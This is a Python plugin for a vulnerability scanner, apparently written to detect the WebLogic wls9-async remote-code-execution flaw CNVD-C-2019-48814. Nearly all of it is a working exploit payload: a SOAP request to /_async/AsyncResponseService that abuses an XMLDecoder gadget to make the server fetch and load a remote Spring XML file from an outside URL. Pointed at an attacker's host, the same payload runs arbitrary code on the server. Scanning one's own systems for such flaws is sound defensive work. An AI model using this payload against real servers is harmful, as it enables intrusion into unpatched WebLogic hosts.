#!/usr/bin/env python
# -*- coding:utf-8 -*-
# CNVD-C-2019-48814  from http://www.cnvd.org.cn/webinfo/show/4999
# Author: Ntears

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'rce_cnvdc201948814'
        self.info = "Check the WebLogic wls9-async RCE CNVD-C-2019-48814"
        self.keyword = ['all', 'weblogic', 'rce', 'web', 'intranet', 'cnvd-c-2019-48814', 'danger', '7001',]
        self.default_ports_list = [7001,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        poc = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
             <soapenv:Header> 
                 <wsa:Action>xx</wsa:Action>
                 <wsa:RelatesTo>xx</wsa:RelatesTo>
                     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                             <java>
                             <class>
                             <string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
                             <void>
                             <string>http://baidu.com</string>
                             </void>
                             </class>
                             </java> 
                     </work:WorkContext>  
                 </soapenv:Header> 
                 <soapenv:Body>   
                <asy:onAsyncDelivery/>  
            </soapenv:Body>
        </soapenv:Envelope>
        '''
        heads = {
                  'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                  'Content-Type': 'text/xml;charset=UTF-8'
        }      
        try:
            url = "http://"+str(ip)+":"+str(port)+"/_async/AsyncResponseService"
            req = Requester(url, method='post', data=poc, noencode=True, header=heads)
            if req.code == 202:
                result = "exeists WebLogic wls9-async RCE CNVD-C-2019-48814"
                self._output(ip, port, result)
                return
        except:
            pass

globals()['VulnChecker'] = VulnChecker
